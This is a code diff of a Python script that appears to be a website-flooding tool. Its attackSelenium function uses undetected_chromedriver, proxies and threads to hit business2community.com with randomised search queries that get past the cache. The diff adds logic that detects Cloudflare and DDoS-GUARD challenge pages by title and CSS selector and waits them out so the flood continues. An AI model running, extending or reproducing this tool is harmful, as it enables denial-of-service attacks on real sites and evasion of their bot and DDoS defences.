@@ -10,7 +10,10 @@ import os
 import re
 import undetected_chromedriver as uc
 import shutil
-
+from selenium.common import TimeoutException
+from selenium.webdriver.support.wait import WebDriverWait
+from selenium.webdriver.support.expected_conditions import presence_of_element_located, staleness_of, title_is
+from selenium.webdriver.common.by import By
 
 # printing lowercase
 letters = string.ascii_lowercase
@@ -21,6 +24,8 @@ PROXY_PASS = '123123123'
 PROXY_URL_BASE = 'http://'+PROXY_USER+':'+PROXY_PASS+'@gb.smartproxy.com:PORT'
 
 PROXY_URL= '127.0.0.1:8080'
+
+SHORT_TIMEOUT = 10
 
 proxies = {
    'http': PROXY_URL,
@@ -165,6 +170,19 @@ def start_xvfb_display():
         XVFB_DISPLAY = Xvfb()
         XVFB_DISPLAY.start()
 
+CHALLENGE_TITLES = [
+    # Cloudflare
+    'Just a moment...',
+    # DDoS-GUARD
+    'DDOS-GUARD',
+]
+CHALLENGE_SELECTORS = [
+    # Cloudflare
+    '#cf-challenge-running', '.ray_id', '.attack-box', '#cf-please-wait', '#challenge-spinner', '#trk_jschal_js',
+    # Custom CloudFlare for EbookParadijs, Film-Paleis, MuziekFabriek and Puur-Hollands
+    'td.info #js_info'
+]
+
 def attackSelenium(baseUrl):
 	global PATCHED_DRIVER_PATH
 
@@ -204,6 +222,55 @@ def attackSelenium(baseUrl):
 		try:
 			url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(10)) 
 			driver.get(url)
+
+			html_element = driver.find_element(By.TAG_NAME, "html")
+			page_title = driver.title
+
+			challenge_found = False
+			for title in CHALLENGE_TITLES:
+				if title == page_title:
+					challenge_found = True
+					print("Challenge detected. Title found: " + title)
+					break
+			if not challenge_found:
+				# find challenge by selectors
+				for selector in CHALLENGE_SELECTORS:
+					found_elements = driver.find_elements(By.CSS_SELECTOR, selector)
+					if len(found_elements) > 0:
+						challenge_found = True
+						print("Challenge detected. Selector found: " + selector)
+						break
+
+			if challenge_found:
+				while True:
+					try:
+						# wait until the title changes
+						for title in CHALLENGE_TITLES:
+							print("Waiting for title: " + title)
+							WebDriverWait(driver, SHORT_TIMEOUT).until_not(title_is(title))
+
+						# then wait until all the selectors disappear
+						for selector in CHALLENGE_SELECTORS:
+							print("Waiting for selector: " + selector)
+							WebDriverWait(driver, SHORT_TIMEOUT).until_not(
+								presence_of_element_located((By.CSS_SELECTOR, selector)))
+
+						# all elements not found
+						break
+
+					except TimeoutException:
+						print("Timeout waiting for selector")
+						html_element = driver.find_element(By.TAG_NAME, "html")
+
+				# waits until cloudflare redirection ends
+				print("Waiting for redirect")
+				try:
+					WebDriverWait(driver, SHORT_TIMEOUT).until(staleness_of(html_element))
+				except Exception:
+					print("Timeout waiting for redirect")
+
+				print('challenge solved')
+
 			print(driver.title)
 			# input()
 		except Exception as err:
@@ -214,7 +281,7 @@ def attackSelenium(baseUrl):
 flareSolverUrl = 'http://localhost:8191/v1'
 
 
-for i in range(5):
+for i in range(1):
 	Thread(target=attackSelenium, args=['https://www.business2community.com']).start()
 input()
 
